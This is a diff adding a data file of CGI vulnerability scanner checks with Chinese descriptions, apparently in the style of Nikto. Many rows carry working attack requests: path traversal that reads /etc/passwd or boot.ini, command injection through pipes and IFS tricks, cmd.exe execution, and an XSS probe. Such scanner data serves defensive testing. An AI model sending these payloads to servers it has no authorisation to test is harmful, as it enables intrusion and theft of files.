@@ -1,0 +1,1130 @@
+3#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScart32.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#请求cart32.exe/cart32clientlist#d9Fa0j#
+4#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSclassified.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#根据RFP，检查Phrack 55信息#d9Fa0j#
+5#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSdownload.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#v1 by Matt Wright；根据RFP，检查Phrack 55信息#d9Fa0j#
+6#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSflexform.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#根据RFP，检查Phrack 55信息，允许在可写入文件后附加信息。#d9Fa0j#
+7#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSflexform#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#根据RFP，检查Phrack 55信息，允许在可写入文件后附加信息。#d9Fa0j#
+8#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSlwgate.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#根据RFP，检查Phrack 55信息，http://www.phrack.com/show.php?p=55Check Phrack 55 for info by RFP#d9Fa0j#
+9#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSLWGate.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#根据RFP，检查Phrack 55信息，http://www.phrack.com/show.php?p=55Check Phrack 55 for info by RFP#d9Fa0j#
+10#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSlwgate#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#根据RFP，检查Phrack 55信息#d9Fa0j#
+11#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSLWGate#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#根据RFP，检查Phrack 55信息#d9Fa0j#
+12#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSperlshop.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#v3.1 by ARPAnet.com，根据RFP，检查Phrack 55信息#d9Fa0j#
+25#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRShandler.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Irix Handler的变种？已经从其他的一些CGI扫描器中出现过#d9Fa0j#
+26#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSfinger#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#finger其他用户，也可能是其他命令？#d9Fa0j#
+27#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSfinger.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#finger其他用户，也可能是其他命令？#d9Fa0j#
+28#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSformmail.cgi#d9Fa0j#GET#d9Fa0j#Version #d9Fa0j#远程CGI泄露了版本号，它可以帮助攻击者发现脚本中的弱点#d9Fa0j#
+30#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSformmail#d9Fa0j#GET#d9Fa0j#Version #d9Fa0j#远程CGI泄露了版本号，它可以帮助攻击者发现脚本中的弱点#d9Fa0j#
+31#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSget32.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#可能允许攻击者远程执行任意命令#d9Fa0j#
+32#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSgm-authors.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Greymatter的‘password’文件，它控制着谁能够执行post操作。这个文件包含登录和密码信息并且安装时采用了666的缺省权限。更多信息请参考http://www.attrition.org/~jericho/works/security/greymatter.html#d9Fa0j#
+33#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSguestbook/passwd#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#来自于lasource.r2.ru站点的GuestBook r4在明文文本文件中保存admin的密码#d9Fa0j#
+34#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRShorde/test.php?mode=phpinfo#d9Fa0j#GET#d9Fa0j#PHP Version#d9Fa0j#Horde允许执行phpinfo()，它会显示详细的系统信息#d9Fa0j#
+35#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSphoto/protected/manage.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#My Photo Gallery管理接口。可以允许对照片文件夹（galleries）和更多内容的全权访问。3.8之前的版本允许任何用户查看系统中任意目录的内容#d9Fa0j#
+36#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwrap.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#可能的变种：从IRIX 6.2出现；允许查看目录#d9Fa0j#
+55#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSformmail.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#FormMail的许多版本有远程弱点，包括文件访问，信息泄露和邮件滥用。FormMail的访问应当尽最大可能的进行限制或者寻找更加安全的解决方案#d9Fa0j#
+56#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRShorde/test.php#d9Fa0j#GET#d9Fa0j#Horde Versions#d9Fa0j#Horde脚本泄露系统/Horde的详细信息#d9Fa0j#
+60#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSvisadmin.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这个CGI能导致攻击者使web服务器崩溃。从CGI目录移走#d9Fa0j#
+61#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRShtml2chtml.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Html2Wml < 0.4.8通过CGI访问本地文件，可能还有更多情况#d9Fa0j#
+62#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRShtml2wml.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Html2Wml < 0.4.8通过CGI访问本地文件，可能还有更多情况#d9Fa0j#
+63#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSpollit/Poll_It_SSI_v2.0.cgi?data_dir=\etc\passwd%00#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#Poll_It_SSI_v2.0.cgi允许攻击者获取任意文件#d9Fa0j#
+64#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSecho.bat?&dir+c:\\#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这个批处理文件可以允许攻击者执行远程命令#d9Fa0j#
+65#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSexcite;IFS=\$\";/bin/cat /etc/passwd"#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#Excite软件容易被利用进行命令执行#d9Fa0j#
+66#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#EZShopper loadpage CGI命令执行#d9Fa0j#
+67#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSguestbook.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#可能允许攻击者像web守护进程一样执行命令#d9Fa0j#
+68#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSguestbook.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#可能允许攻击者像web守护进程一样执行命令#d9Fa0j#
+69#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSss#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Mediahouse Statistics Server可以允许攻击者执行远程命令。升级到最新版本或者从CGI中移走#d9Fa0j#
+76#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSgH.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#web后门 by gH#d9Fa0j#
+77#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSgm-cplog.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#GreyMatter日志文件缺省权限为666并且包含可以用来更新GM站点的登录名和密码。更多信息请参考http://www.attrition.org/~jericho/works/security/greymatter.html#d9Fa0j#
+80#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSgm.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#GreyMatter blogger可能泄露用户id/密码通过gmrightclick-######.reg文件（#是数字），文件可能在/archive或者其他备份位置。更多信息请参考http://www.attrition.org/~jericho/works/security/greymatter.html#d9Fa0j#
+82#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSAT-admin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#管理接口...#d9Fa0j#
+84#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSawstats.pl#d9Fa0j#GET#d9Fa0j#Traffic#d9Fa0j#用于网站的高级统计分析的免费实时日志文件分析器。应当被保护#d9Fa0j#
+85#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSawstats/awstats.pl#d9Fa0j#GET#d9Fa0j#Traffic#d9Fa0j#用于网站的高级统计分析的免费实时日志文件分析器。应当被保护#d9Fa0j#
+86#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSblog/mt.cfg#d9Fa0j#GET#d9Fa0j#configuration file#d9Fa0j#发现了可移动的类型配置文件。不应该被远程访问到#d9Fa0j#
+87#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScart.pl?db='#d9Fa0j#GET#d9Fa0j#c:\\#d9Fa0j#Dansie Shopping Cart泄露了CGI目录的全路径#d9Fa0j#
+89#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRShtsearch?config=foofighter&restrict=&exclude=&method=and&format=builtin-long&sort=score&words=#d9Fa0j#GET#d9Fa0j#ht:\/\/Dig#d9Fa0j#安装的ht://Dig可能泄露它的配置文件的路径，正在泄露关于服务器的敏感信息#d9Fa0j#
+90#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmt-static/mt-check.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可移动类型的weblog诊断脚本。泄露docroot路径，操作系统，perl版本号和模块#d9Fa0j#
+91#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmt/mt-check.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可移动类型的weblog诊断脚本。泄露docroot路径，操作系统，perl版本号和模块#d9Fa0j#
+99#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSbanner.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这个CGI可能允许攻击者读取系统上的任何文件#d9Fa0j#
+100#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSbannereditor.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这个CGI可能允许攻击者读取系统上的任何文件#d9Fa0j#
+103#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSarchitext_query.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Excite for Web Servers早于1.1版本的允许攻击者执行任意命令#d9Fa0j#
+104#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSbizdb1-search.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这个CGI可能允许攻击者远程执行命令。参考http://www.hack.co.za/daem0n/cgi/cgi/bizdb.htm#d9Fa0j#
+105#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSblog/#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现blog。可能包含CGI安全问题，弱口令，以及更多情况#d9Fa0j#
+107#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSblog/mt-load.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可移动类型的weblog安装CGI。有可能重新配置或者重新加载配置#d9Fa0j#
+135#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScgiwrap/%3Cfont%20color=red%3E#d9Fa0j#GET#d9Fa0j#<font color=red>#d9Fa0j#cgiwrap允许HTML和可能的XSS注入。更多信息请参考http://archives.neohapsis.com/archives/bugtraq/2001-07/0499.html。#d9Fa0j#
+136#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmoin.cgi?test#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#MoinMoin 1.1及之前的版本包含至少2个XSS漏洞。版本1.0和之前的版本也包含一个XSLT相关的漏洞#d9Fa0j#
+188#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSastrocam.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Astrocam 1.4.1包含了缓冲区溢出BID-4684。在2.1.3以前的版本包含了未指定的安全缺陷#d9Fa0j#
+189#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSbadmin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#BannerWheel v1.0易于受到本地缓冲区溢出。如果是1.0版本，应该尽快升级。#d9Fa0j#
+191#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSezadmin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这个CGI的一些版本对于缓冲区溢出，比较脆弱。#d9Fa0j#
+192#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSezboard.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这个CGI的一些版本对于缓冲区溢出，比较脆弱。#d9Fa0j#
+193#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSezman.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这个CGI的一些版本对于缓冲区溢出，比较脆弱。#d9Fa0j#
+194#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSfoxweb.dll#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Foxweb 2.5及以下版本易于受到缓冲区溢出攻击（没有测试或者确认过）。请验证Foxweb是否是最新可用的版本。#d9Fa0j#
+195#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSfoxweb.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Foxweb 2.5及以下版本易于受到缓冲区溢出攻击（没有测试或者确认过）。请验证Foxweb是否是最新可用的版本。#d9Fa0j#
+196#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmgrqcgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#来自于Magic Enterprise 8.30-5和早期版本的这个CGI，易于受到多个缓冲区溢出攻击。升级到9.x。#d9Fa0j#
+197#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwconsole.dll#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#用1024字节的数据有可能使这个dll溢出#d9Fa0j#
+198#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwebplus.exe?about#d9Fa0j#GET#d9Fa0j#Product Information#d9Fa0j#Webplus可能泄露产品信息，包括版本号。版本4.X及以下的有一个文件读取漏洞。4.6 build 561之前的版本和5.0 build 554有一个缓冲区溢出。#d9Fa0j#
+213#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSfpsrvadm.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#潜在的脆弱的CGI程序#d9Fa0j#
+237#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRS.cobalt#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#可以允许远程管理CGI脚本#d9Fa0j#
+253#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmailit.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过这个CGI，任何主机可以利用Sambar发出匿名邮件。#d9Fa0j#
+259#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRS.access#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#包含授权信息#d9Fa0j#
+260#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRS%2e%2e/abyss.conf#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Abyss配置文件被成功获得。升级到最新版本或者为1.0打补丁，http://www.aprelium.com/#d9Fa0j#
+261#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSdata/fetch.php?page=#d9Fa0j#GET#d9Fa0j#mysql_num_rows#d9Fa0j#StellarDocs允许远程用户看到文件系统路径。BID-8385。#d9Fa0j#
+262#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSempower?DB=whateverwhatever#d9Fa0j#GET#d9Fa0j#db name whateverwhatever of directory /#d9Fa0j#这个CGI允许攻击者了解到你的web目录的完整系统路径。#d9Fa0j#
+263#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmrtg.cgi?cfg=blah#d9Fa0j#GET#d9Fa0j#Cannot find the given config file#d9Fa0j#当不正确的配置文件被指定的时候，Multi Router Traffic Grapher (mrtg.org)泄露系统路径。软件应当升级到最新版本。#d9Fa0j#
+314#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSMsmMask.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#MondoSearch 4.4可能允许源码查看，通过请求MsmMask.exe?mask=/filename.asp，这里的 'filename.asp'是一个真实的asp文件。#d9Fa0j#
+335#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSaddbanner.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这个CGI可能允许攻击者读取系统上的任意文件。#d9Fa0j#
+336#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSaf.cgi?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#AlienForm2 revision 1.5允许读取远程系统上的任意文件。#d9Fa0j#
+337#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSalienform.cgi?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#AlienForm2 revision 1.5允许读取远程系统上的任意文件。#d9Fa0j#
+338#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSshtml.dll#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这个可能允许攻击者获取文档源。#d9Fa0j#
+340#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSaglimpse.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这个CGI可能允许攻击者执行远程命令#d9Fa0j#
+341#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSaglimpse#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这个CGI可能允许攻击者执行远程命令#d9Fa0j#
+342#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSarchitext_query.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#版本早于1.1的1.1 of Excite for Web Servers允许攻击者执行任意命令。#d9Fa0j#
+348#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScmd.exe?/c+dir#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#cmd.exe能允许执行任意命令#d9Fa0j#
+349#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScmd1.exe?/c+dir#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#cmd1.exe能允许执行任意命令#d9Fa0j#
+350#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRShello.bat?&dir+c:\\#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这个批处理文件可以允许攻击者执行远程命令#d9Fa0j#
+351#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSpost32.exe|dir%20c:\\#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#post32能执行任意命令。#d9Fa0j#
+385#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/nsn/..%5Cwebdemo/env.bas#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#可能访问到Netbase util，它意味着几个辅助性utility脚本有可能运行起来（包括列目录，NDS树枚举和在服务器上运行.bas文件）#d9Fa0j#
+386#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/nsn/..%5Cwebdemo/fdir.bas#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#可能访问到Netbase util，它意味着几个辅助性utility脚本有可能运行起来（包括列目录，NDS树枚举和在服务器上运行.bas文件）#d9Fa0j#
+388#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSarchie#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#unix命令网关，可能提交额外的命令。#d9Fa0j#
+389#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScalendar.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#unix命令网关，可能提交额外的命令。#d9Fa0j#
+390#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScalendar#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#unix命令网关，可能提交额外的命令。#d9Fa0j#
+391#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSdate#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#unix命令网关，可能提交额外的命令。#d9Fa0j#
+392#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSfortune#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#unix命令网关，可能提交额外的命令。#d9Fa0j#
+393#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSredirect#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过表单重定向URL#d9Fa0j#
+394#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSuptime#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#unix命令网关，可能提交额外的命令。#d9Fa0j#
+395#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwais.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#unix命令网关，可能提交额外的命令。#d9Fa0j#
+424#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScom5..........................................................................................................................................................................................................................box#d9Fa0j#GET#d9Fa0j#Execution of Perl script#d9Fa0j#当使用不符合语法的请求访问DOS设备时，Lotus泄露文件系统路径。#d9Fa0j#
+425#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScom5.java#d9Fa0j#GET#d9Fa0j#Execution of#d9Fa0j#当使用不符合语法的请求访问DOS设备时，Lotus泄露文件系统路径。#d9Fa0j#
+426#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScom5.pl#d9Fa0j#GET#d9Fa0j#Execution of Perl script#d9Fa0j#当使用不符合语法的请求访问DOS设备时，Lotus泄露文件系统路径。#d9Fa0j#
+438#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmail#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#简单的PERL邮件脚本可以发送表单内容到预定义的邮箱。#d9Fa0j#
+439#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSnph-error.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#在错误消息中显示更多信息。#d9Fa0j#
+440#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSpost-query#d9Fa0j#POST#d9Fa0j#200#d9Fa0j#返回POST结果#d9Fa0j#
+441#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSquery#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#返回GET结果#d9Fa0j#
+442#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRStest-cgi.tcl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#可能显示环境变量或目录列表#d9Fa0j#
+443#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRStest-env#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#可能显示环境变量或目录列表#d9Fa0j#
+456#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSindex.js0x70#d9Fa0j#GET#d9Fa0j#\<\%\=#d9Fa0j#通过在URL末尾添加'0x70'，Weblogic会被欺骗而泄露jsp源代码。#d9Fa0j#
+479#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScgitest.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#此CGI允许远程用户下载其它CGI源代码。可能User-Agent头中有缓冲区溢出。#d9Fa0j#
+486#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSPbcgi.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#当一个长字符串发送给Pbcgi.exe时，Sambar可能易于受到DOS攻击（未尝试）。默认CGI应该从此服务器删除。#d9Fa0j#
+487#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRStestcgi.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#当一个长字符串发送给testcgi.exe时，Sambar可能易于受到DOS攻击（未尝试）。默认CGI应该从此服务器删除。#d9Fa0j#
+499#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwebfind.exe?keywords=01234567890123456789#d9Fa0j#GET#d9Fa0j#500#d9Fa0j#可能受到缓冲区溢出攻击（请求2000字节的数据）。升级到WebSitePro 2.5或更高。#d9Fa0j#
+502#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSans.pl?p=../../../../../usr/bin/id|&blah#d9Fa0j#GET#d9Fa0j#uid#d9Fa0j#Avenger's News System允许远程发送命令。#d9Fa0j#
+503#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSans/ans.pl?p=../../../../../usr/bin/id|&blah#d9Fa0j#GET#d9Fa0j#uid#d9Fa0j#Avenger's News System允许远程发送命令。#d9Fa0j#
+528#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSAlbum?mode=album&album=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc&dispsize=640&start=0#d9Fa0j#GET#d9Fa0j#resolv.conf#d9Fa0j#此CGI允许攻击者查看服务器上的任意文件。#d9Fa0j#
+533#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRStest.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\#d9Fa0j#GET#d9Fa0j#boot.ini#d9Fa0j#此CGI允许攻击者读取服务器上的文件。#d9Fa0j#
+534#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRStst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,#d9Fa0j#GET#d9Fa0j#boot.ini#d9Fa0j#此CGI允许攻击者在服务器上执行任意命令。#d9Fa0j#
+535#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSinput.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\#d9Fa0j#GET#d9Fa0j#boot.ini#d9Fa0j#此CGI允许攻击者读取服务器上的文件。#d9Fa0j#
+536#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSinput2.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\#d9Fa0j#GET#d9Fa0j#boot.ini#d9Fa0j#此CGI允许攻击者读取服务器上的文件。#d9Fa0j#
+578#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSadmin.cgi?list=../../../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#Add2it Mailman Free V1.73 允许获取任意文件。#d9Fa0j#
+579#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRS14all.cgi?cfg=../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#Multi Router Traffic Grapher (mrtg.org)易于受到'show files'攻击。应该升级到最新版本。#d9Fa0j#
